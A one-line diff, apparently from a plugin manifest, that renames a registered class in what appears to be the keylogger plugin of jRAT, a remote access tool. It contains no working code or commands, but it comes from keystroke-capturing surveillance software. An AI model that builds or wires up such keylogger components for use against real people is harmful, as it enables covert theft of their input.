@@ -1,1 +1,1 @@
-se.jrat.plugin.keylogger.client.ClientPlugin
+se.jrat.plugin.keylogger.client.KeyloggerPlugin
